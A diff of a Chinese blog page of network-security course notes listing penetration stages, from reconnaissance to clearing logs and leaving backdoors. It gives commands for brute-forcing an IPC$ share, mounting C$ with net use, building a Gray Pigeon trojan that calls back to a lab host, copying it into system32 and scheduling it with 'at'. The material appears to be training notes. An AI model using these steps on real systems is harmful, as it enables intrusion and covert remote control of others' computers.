@@ -175,7 +175,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      232 字
+      334 字
     </span>
   
 
@@ -185,7 +185,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      4
        分钟
     </span>
   
@@ -224,15 +224,31 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h2 id="0-授权"><a href="#0-授权" class="headerlink" title="0.授权"></a>0.授权</h2><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>  nslookup whois</p>
-<h2 id="2-扫描漏洞"><a href="#2-扫描漏洞" class="headerlink" title="2.扫描漏洞"></a>2.扫描漏洞</h2><p>  namp=ip范围 端口 80（IIS，apache，什么网站）scanport<br>  高级扫描：如IIS漏洞2003-IIS6.0 2008IIS7.0<br>            扫描网站漏洞（）</p>
-<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><h2 id="4-提权（shell环境、桌面环境、最高权限）"><a href="#4-提权（shell环境、桌面环境、最高权限）" class="headerlink" title="4.提权（shell环境、桌面环境、最高权限）"></a>4.提权（shell环境、桌面环境、最高权限）</h2><h2 id="5-毁尸灭迹"><a href="#5-毁尸灭迹" class="headerlink" title="5.毁尸灭迹"></a>5.毁尸灭迹</h2><h2 id="6-留后门"><a href="#6-留后门" class="headerlink" title="6.留后门"></a>6.留后门</h2><h2 id="7-渗透测试报告"><a href="#7-渗透测试报告" class="headerlink" title="7.渗透测试报告"></a>7.渗透测试报告</h2><p>手工测试端口号开放：<br>telnet IP地址 测试端口</p>
+              <h2 id="0-授权"><a href="#0-授权" class="headerlink" title="0.授权"></a>0.授权</h2><p>人为授权 同意对计算机更改处理</p>
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>  nslookup whois</p>
+<h2 id="2-扫描漏洞"><a href="#2-扫描漏洞" class="headerlink" title="2.扫描漏洞"></a>2.扫描漏洞</h2><ol>
+<li><p>namp=ip范围 端口 80（IIS，apache，什么网站）</p>
+</li>
+<li><p>scanport<br> 高级扫描：如IIS漏洞2003-IIS6.0 2008-IIS7.0  攻击发布软件</p>
+<pre><code>扫描网站漏洞（网址 代码） 攻击网站</code></pre><p>最终目的拿到网站控制权限</p>
+</li>
+</ol>
+<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><h2 id="4-提权（shell环境、桌面环境、最高权限）"><a href="#4-提权（shell环境、桌面环境、最高权限）" class="headerlink" title="4.提权（shell环境、桌面环境、最高权限）"></a>4.提权（shell环境、桌面环境、最高权限）</h2><h2 id="5-毁尸灭迹"><a href="#5-毁尸灭迹" class="headerlink" title="5.毁尸灭迹"></a>5.毁尸灭迹</h2><p>清除日志记录</p>
+<h2 id="6-留后门"><a href="#6-留后门" class="headerlink" title="6.留后门"></a>6.留后门</h2><h2 id="7-渗透测试报告"><a href="#7-渗透测试报告" class="headerlink" title="7.渗透测试报告"></a>7.渗透测试报告</h2><p>手工测试端口号开放：<br>telnet IP地址 测试端口</p>
 <p>1.scanport扫描445端口</p>
-<p>2.漏洞利用之IPC$：<br>进行暴力破解：NTscan</p>
+<p>2.445漏洞利用之IPC$：<br>进行暴力破解：NTscan  </p>
 <p>3.</p>
-<h1 id="net-use-10-1-1-2-ipc-密码-user-用户"><a href="#net-use-10-1-1-2-ipc-密码-user-用户" class="headerlink" title="net use  \10.1.1.2\ipc$ 密码 /user:用户"></a>net use  \10.1.1.2\ipc$ 密码 /user:用户</h1><p>net use f: \10.1.1.2\share 密码 /user:用户<br>net use f: /del<br>net use * /del</p>
-<h1 id="net-use-f-10-1-1-2-c-密码-user-用户"><a href="#net-use-f-10-1-1-2-c-密码-user-用户" class="headerlink" title="net use f: \10.1.1.2\c$ 密码 /user:用户"></a>net use f: \10.1.1.2\c$ 密码 /user:用户</h1><p>4.制作木马<br>利用光盘上的灰鸽子软件</p>
-<p>5.植入木马（留后门）<br>copy d:\heihei.exe \10.1.1.2\c$</p>
+<p><strong>net use  \10.1.1.2\ipc$ 密码 /user:用户</strong> </p>
+<hr>
+<p>net use f: \10.1.1.2\share 密码 /user:用户    将远程服务器的文件映射到本地来<br>net use f: /del<br>net use * /del</p>
+<p>net use f: \10.1.1.2\c$ 密码 /user:用户 </p>
+<p>net use  \10.1.1.2\ipc$ 密码 /user:用户 </p>
+<hr>
+<p>4.制作木马<br>利用光盘上的灰鸽子</p>
+<pre><code class="hljs angelscript">配置服务程序-安装选项 启动项设置-自动线上（<span class="hljs-number">10.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>） 生成服务器</code></pre>
+
+<p>5.植入木马（留后门）</p>
+<p>copy d:\heihei.exe \10.1.1.2\c$\windows\system32</p>
 <p>6.设置计划任务自动执行木马：<br>net time \10.1.1.2<br>at \10.1.1.2 11:11 “c:\heihei.exe”</p>
 <p>7.等待肉鸡上线</p>
 
@@ -267,12 +283,18 @@
                   <div class="post-prev col-6">
                     
                     
+                      <a href="/2020/07/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8day10/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">扫描与爆破</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/07/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8day07/">
-                        <span class="hidden-mobile">域</span>
+                      <a href="/2020/07/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8day08/">
+                        <span class="hidden-mobile">PKI</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
